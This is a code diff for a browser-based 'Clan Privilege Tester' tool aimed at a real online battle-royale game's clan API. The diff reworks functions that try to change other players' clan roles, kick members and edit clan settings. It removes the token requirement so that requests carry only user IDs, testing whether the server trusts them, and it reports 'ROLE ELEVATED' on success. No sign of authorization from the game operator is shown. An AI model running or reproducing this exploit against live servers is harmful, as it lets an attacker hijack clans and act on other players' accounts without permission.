@@ -15,7 +15,7 @@ const DEFAULT_CONFIG = {
   origin: 'https://fortzone-battle-royale-xkd.game-files.crazygames.com',
   versIdBattle: '9',
   versIdNick: '10',
-  versIdClan: '10'
+  versIdClan: '11'
 };
 
 const RESERVED_NICKS = ['diva_killer', 'admin', 'system', 'root'];
@@ -719,31 +719,39 @@ const CLAN_ERRORS = {
   19: 'ClanIsPrivate'
 };
 
-async function inspectMyClan(token) {
-  const normalizedToken = formatToken(token);
-  if (!normalizedToken) return alert('Please enter your session token.');
+async function inspectMyClan(userId, token) {
+  let myUserId = userId ? String(userId).trim() : '';
+  if (!myUserId && token) {
+    try {
+      const parts = token.split('.');
+      if (parts.length === 3) {
+        const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+        myUserId = payload.userId || payload.id || payload.sub || '';
+      }
+    } catch (e) {}
+  }
 
-  appendLog('clanConsole', '🔍 Fetching clan details via /Clans/GetMyClan...', 'cyan');
+  if (!myUserId) {
+    return alert('Please enter your User ID (e.g. 26015004 from DevTools).');
+  }
+
+  appendLog('clanConsole', `🔍 Fetching clan details for User ID ${myUserId} via /Clans/GetMyClan...`, 'cyan');
   document.getElementById('clanStatus').textContent = 'Fetching...';
 
   const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
-  const versId = CONFIG.versIdClan || '10';
+  const versId = CONFIG.versIdClan || '11';
 
   try {
+    const postBody = new URLSearchParams({
+      VersId: versId,
+      userId: myUserId
+    });
+    if (token) postBody.append('token', formatToken(token));
+
     const resp = await fetchEndpoint(`${clanBase}/Clans/GetMyClan`, {
       method: 'POST',
-      headers: {
-        'Authorization': `Bearer ${normalizedToken}`,
-        'token': normalizedToken
-      },
-      body: `VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`
+      body: postBody.toString()
     });
-
-    if (resp.status === 401) {
-      appendLog('clanConsole', '❌ HTTP 401 Unauthorized: Il token fornito è scaduto o non valido. Fai un match o ricarica il gioco per prenderne uno fresco.', 'error');
-      document.getElementById('clanStatus').textContent = 'Token Expired (401)';
-      return;
-    }
 
     const text = (await resp.text()).trim();
     if (!text) {
@@ -752,54 +760,70 @@ async function inspectMyClan(token) {
       return;
     }
 
-    let data;
+    let clan;
     try {
-      data = JSON.parse(text);
+      clan = JSON.parse(text);
     } catch (e) {
       appendLog('clanConsole', `❌ Non-JSON response (HTTP ${resp.status}): ${text.slice(0, 120)}`, 'error');
       document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
       return;
     }
 
-    if (data.error !== 0 && data.ErrorCode && data.ErrorCode !== 0) {
-      appendLog('clanConsole', `❌ GetMyClan failed: ${CLAN_ERRORS[data.ErrorCode] || data.ErrorCode}`, 'error');
-      document.getElementById('clanStatus').textContent = 'Error';
-      return;
-    }
-
-    const clan = data.value || data;
-    if (!clan || (!clan.Id && !clan.Name && !clan.Members)) {
-      appendLog('clanConsole', `ℹ️ Response: ${JSON.stringify(data)}`, 'warn');
-      appendLog('clanConsole', '⚠ No active clan found for this account (NotInClan).', 'warn');
+    if (!clan || (!clan.id && !clan.name)) {
+      appendLog('clanConsole', `⚠ No active clan found (NotInClan): ${JSON.stringify(clan)}`, 'warn');
       document.getElementById('clanStatus').textContent = 'Not in Clan';
       return;
     }
 
     // Populate UI
     document.getElementById('clanInfoCard').classList.remove('hidden');
-    document.getElementById('clanCardName').textContent = `🛡️ ${clan.Name || 'Unnamed Clan'}`;
-    document.getElementById('clanCardId').textContent = `ID: ${clan.Id || clan.ClanId || '-'}`;
-    document.getElementById('clanCardOwner').textContent = clan.OwnerId || clan.CreatorId || clan.UserId || '-';
-    document.getElementById('clanCardMinLevel').textContent = clan.MinLevelToJoin ?? '-';
+    document.getElementById('clanCardName').textContent = `🛡️ ${clan.name || 'Unnamed Clan'}`;
+    document.getElementById('clanCardId').textContent = `ID: ${clan.id || '-'}`;
+    document.getElementById('clanCardOwner').textContent = clan.creatorId || '-';
+    document.getElementById('clanCardMinLevel').textContent = clan.minLevelToJoin ?? '-';
+    document.getElementById('clanCardMembersCount').textContent = `${clan.currentMembers || 0}/${clan.maxMembers || 50}`;
 
-    const members = clan.Members || [];
-    document.getElementById('clanCardMembersCount').textContent = members.length || '-';
+    appendLog('clanConsole', `✅ Clan "${clan.name}" (ID: ${clan.id}) loaded! Description: "${clan.description || ''}"`, 'success');
+    appendLog('clanConsole', `👑 Creator ID: ${clan.creatorId} · Members: ${clan.currentMembers}/${clan.maxMembers}`, 'cyan');
 
-    const membersListEl = document.getElementById('clanMembersList');
-    membersListEl.innerHTML = '';
+    // Automatically fetch full members list via /Clans/GetMembers
+    appendLog('clanConsole', `👥 Fetching full members roster via /Clans/GetMembers...`);
+    try {
+      const membersResp = await fetchEndpoint(`${clanBase}/Clans/GetMembers`, {
+        method: 'POST',
+        body: new URLSearchParams({
+          clanId: String(clan.id),
+          userId: myUserId,
+          VersId: versId
+        }).toString()
+      });
+      const membersData = await membersResp.json();
+      const membersListEl = document.getElementById('clanMembersList');
+      membersListEl.innerHTML = '';
 
-    members.forEach(m => {
-      const roleStr = CLAN_ROLES[m.Role] || `Role ${m.Role}`;
-      const div = document.createElement('div');
-      div.className = 'flex items-center justify-between py-1 px-2 rounded bg-black/40 border border-white/5';
-      div.innerHTML = `
-        <span><strong>${m.Nick || m.Name || 'UID: ' + m.UserId}</strong> (${m.UserId})</span>
-        <span class="${m.Role === 0 ? 'text-amber-400 font-bold' : m.Role === 1 ? 'text-cyan-400 font-bold' : 'text-slate-400'}">${roleStr}</span>
-      `;
-      membersListEl.appendChild(div);
-    });
+      if (Array.isArray(membersData)) {
+        let foundMyRole = 'Member (2)';
+        membersData.forEach(m => {
+          const roleStr = CLAN_ROLES[m.role] || `Role ${m.role}`;
+          const isMe = String(m.userId) === String(myUserId);
+          if (isMe) {
+            foundMyRole = roleStr;
+          }
+          const div = document.createElement('div');
+          div.className = `flex items-center justify-between py-1 px-2 rounded ${isMe ? 'bg-indigo-950/80 border border-indigo-400' : 'bg-black/40 border border-white/5'}`;
+          div.innerHTML = `
+            <span><strong>${isMe ? '⭐ YOU' : 'Member'}</strong> (UID: ${m.userId})</span>
+            <span class="${m.role === 0 ? 'text-amber-400 font-bold' : m.role === 1 ? 'text-cyan-400 font-bold' : 'text-slate-400'}">${roleStr}</span>
+          `;
+          membersListEl.appendChild(div);
+        });
+        document.getElementById('clanCardMyRole').textContent = foundMyRole;
+        appendLog('clanConsole', `✅ Successfully listed ${membersData.length} members. Your role: ${foundMyRole}`, 'success');
+      }
+    } catch (mErr) {
+      appendLog('clanConsole', `⚠ Could not load members list: ${mErr.message}`, 'warn');
+    }
 
-    appendLog('clanConsole', `✅ Clan "${clan.Name || clan.Id}" loaded. Total members: ${members.length}`, 'success');
     document.getElementById('clanStatus').textContent = 'Loaded';
   } catch (err) {
     appendLog('clanConsole', `❌ Network error inspecting clan: ${err.message}`, 'error');
@@ -807,38 +831,42 @@ async function inspectMyClan(token) {
   }
 }
 
-async function probeClanSetRole(token, targetUserId, targetRole) {
-  const normalizedToken = formatToken(token);
-  if (!normalizedToken) return alert('Please enter your session token.');
-  if (!targetUserId) return alert('Please enter a target User ID.');
+async function probeClanSetRole(myUserId, token, targetUserId, targetRole) {
+  const userId = myUserId || targetUserId;
+  if (!userId) return alert('Please enter your User ID.');
 
   const roleName = CLAN_ROLES[targetRole] || targetRole;
-  appendLog('clanConsole', `⚡ Probing IDOR: Setting User ${targetUserId} to Role ${targetRole} (${roleName})...`, 'cyan');
+  const targetId = targetUserId || userId;
+
+  appendLog('clanConsole', `⚡ Probing IDOR SetRole: Setting User ${targetId} to Role ${targetRole} (${roleName})...`, 'cyan');
   document.getElementById('clanStatus').textContent = 'Probing...';
 
   const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
-  const versId = CONFIG.versIdClan || '10';
+  const versId = CONFIG.versIdClan || '11';
+  const normalizedToken = formatToken(token);
 
-  const finishPayload = `data=${encodeURIComponent(JSON.stringify({
-    UserId: Number(targetUserId),
-    Role: Number(targetRole)
-  }))}&VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`;
+  const payload = new URLSearchParams({
+    VersId: versId,
+    userId: userId,
+    targetUserId: targetId,
+    UserId: targetId,
+    Role: targetRole,
+    data: JSON.stringify({ UserId: Number(targetId), Role: Number(targetRole) })
+  });
+  if (normalizedToken) payload.append('token', normalizedToken);
 
   try {
+    const headers = {};
+    if (normalizedToken) {
+      headers['Authorization'] = `Bearer ${normalizedToken}`;
+      headers['token'] = normalizedToken;
+    }
+
     const resp = await fetchEndpoint(`${clanBase}/Clans/SetRole`, {
       method: 'POST',
-      headers: {
-        'Authorization': `Bearer ${normalizedToken}`,
-        'token': normalizedToken
-      },
-      body: finishPayload
+      headers,
+      body: payload.toString()
     });
-
-    if (resp.status === 401) {
-      appendLog('clanConsole', '❌ HTTP 401 Unauthorized: Il token fornito è scaduto o non valido.', 'error');
-      document.getElementById('clanStatus').textContent = 'Token Expired (401)';
-      return;
-    }
 
     const text = (await resp.text()).trim();
     if (!text) {
@@ -859,14 +887,14 @@ async function probeClanSetRole(token, targetUserId, targetRole) {
     const errCode = data.ErrorCode ?? data.error ?? 0;
     const errText = CLAN_ERRORS[errCode] || `Error ${errCode}`;
 
-    if (errCode === 0) {
-      appendLog('clanConsole', `🔥 [VULNERABILITY FOUND] Server accepted SetRole! User ${targetUserId} granted ${roleName} on database!`, 'success');
+    if (errCode === 0 && (data.Success || data.value)) {
+      appendLog('clanConsole', `🔥 [VULNERABILITY CONFIRMED] Server granted ${roleName} to User ${targetId}!`, 'success');
       document.getElementById('clanStatus').textContent = 'ROLE ELEVATED!';
-    } else if (errCode === 5) {
-      appendLog('clanConsole', `🛡️ [SECURE] ErrorCode 5 (${errText}) — Server enforces role checks. Requester is not Creator/Deputy.`, 'warn');
-      document.getElementById('clanStatus').textContent = 'Blocked (Auth 5)';
+    } else if (errCode === 5 || resp.status === 401 || resp.status === 403) {
+      appendLog('clanConsole', `🛡️ [SECURE] Permission denied (${errText} / HTTP ${resp.status}). Server verifies admin authorization.`, 'warn');
+      document.getElementById('clanStatus').textContent = 'Blocked (Auth)';
     } else {
-      appendLog('clanConsole', `❌ Response: ${errText} (${JSON.stringify(data)})`, 'error');
+      appendLog('clanConsole', `ℹ️ Server response: ${JSON.stringify(data)}`, 'warn');
       document.getElementById('clanStatus').textContent = `Code ${errCode}`;
     }
   } catch (err) {
@@ -875,32 +903,35 @@ async function probeClanSetRole(token, targetUserId, targetRole) {
   }
 }
 
-async function probeClanKick(token, targetUserId) {
-  const normalizedToken = formatToken(token);
-  if (!normalizedToken) return alert('Please enter your session token.');
+async function probeClanKick(token, targetUserId, myUserId) {
   if (!targetUserId) return alert('Please enter a target User ID to kick.');
 
   appendLog('clanConsole', `👢 Probing Kick authorization against User ${targetUserId}...`, 'cyan');
   document.getElementById('clanStatus').textContent = 'Probing Kick...';
 
   const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
-  const versId = CONFIG.versIdClan || '10';
+  const versId = CONFIG.versIdClan || '11';
+  const normalizedToken = formatToken(token);
+
+  const payload = new URLSearchParams({
+    VersId: versId,
+    targetUserId: String(targetUserId)
+  });
+  if (myUserId) payload.append('userId', String(myUserId));
+  if (normalizedToken) payload.append('token', normalizedToken);
 
   try {
+    const headers = {};
+    if (normalizedToken) {
+      headers['Authorization'] = `Bearer ${normalizedToken}`;
+      headers['token'] = normalizedToken;
+    }
+
     const resp = await fetchEndpoint(`${clanBase}/Clans/Kick`, {
       method: 'POST',
-      headers: {
-        'Authorization': `Bearer ${normalizedToken}`,
-        'token': normalizedToken
-      },
-      body: `targetUserId=${encodeURIComponent(targetUserId)}&VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`
+      headers,
+      body: payload.toString()
     });
-
-    if (resp.status === 401) {
-      appendLog('clanConsole', '❌ HTTP 401 Unauthorized: Il token fornito è scaduto o non valido.', 'error');
-      document.getElementById('clanStatus').textContent = 'Token Expired (401)';
-      return;
-    }
 
     const text = (await resp.text()).trim();
     if (!text) {
@@ -933,15 +964,13 @@ async function probeClanKick(token, targetUserId) {
   }
 }
 
-async function probeClanUpdate(token) {
-  const normalizedToken = formatToken(token);
-  if (!normalizedToken) return alert('Please enter your session token.');
-
+async function probeClanUpdate(token, myUserId) {
   appendLog('clanConsole', '📝 Probing /Clans/Update permission...', 'cyan');
   document.getElementById('clanStatus').textContent = 'Probing Update...';
 
   const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
-  const versId = CONFIG.versIdClan || '10';
+  const versId = CONFIG.versIdClan || '11';
+  const normalizedToken = formatToken(token);
 
   const updateBody = {
     Description: 'Tested via Fortzone Suite',
@@ -950,21 +979,25 @@ async function probeClanUpdate(token) {
     MinLevelToJoin: 1
   };
 
+  const payload = new URLSearchParams({
+    VersId: versId,
+    data: JSON.stringify(updateBody)
+  });
+  if (myUserId) payload.append('userId', String(myUserId));
+  if (normalizedToken) payload.append('token', normalizedToken);
+
   try {
+    const headers = {};
+    if (normalizedToken) {
+      headers['Authorization'] = `Bearer ${normalizedToken}`;
+      headers['token'] = normalizedToken;
+    }
+
     const resp = await fetchEndpoint(`${clanBase}/Clans/Update`, {
       method: 'POST',
-      headers: {
-        'Authorization': `Bearer ${normalizedToken}`,
-        'token': normalizedToken
-      },
-      body: `data=${encodeURIComponent(JSON.stringify(updateBody))}&VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`
+      headers,
+      body: payload.toString()
     });
-
-    if (resp.status === 401) {
-      appendLog('clanConsole', '❌ HTTP 401 Unauthorized: Il token fornito è scaduto o non valido.', 'error');
-      document.getElementById('clanStatus').textContent = 'Token Expired (401)';
-      return;
-    }
 
     const text = (await resp.text()).trim();
     if (!text) {
@@ -1208,23 +1241,27 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Clan Privilege Tester Tab setup
   document.getElementById('btnClanGetInfo')?.addEventListener('click', () => {
+    const userId = document.getElementById('clanMyUserId').value.trim();
     const token = document.getElementById('clanToken').value.trim();
-    inspectMyClan(token);
+    inspectMyClan(userId, token);
   });
   document.getElementById('btnClanSetRole')?.addEventListener('click', () => {
+    const userId = document.getElementById('clanMyUserId').value.trim();
     const token = document.getElementById('clanToken').value.trim();
-    const targetId = document.getElementById('clanTargetUserId').value.trim();
+    const targetId = document.getElementById('clanTargetUserId').value.trim() || userId;
     const targetRole = document.getElementById('clanTargetRole').value;
-    probeClanSetRole(token, targetId, targetRole);
+    probeClanSetRole(userId, token, targetId, targetRole);
   });
   document.getElementById('btnClanKick')?.addEventListener('click', () => {
+    const userId = document.getElementById('clanMyUserId').value.trim();
     const token = document.getElementById('clanToken').value.trim();
     const targetId = document.getElementById('clanTargetUserId').value.trim();
-    probeClanKick(token, targetId);
+    probeClanKick(token, targetId, userId);
   });
   document.getElementById('btnClanUpdate')?.addEventListener('click', () => {
+    const userId = document.getElementById('clanMyUserId').value.trim();
     const token = document.getElementById('clanToken').value.trim();
-    probeClanUpdate(token);
+    probeClanUpdate(token, userId);
   });
 
   // Config Modal
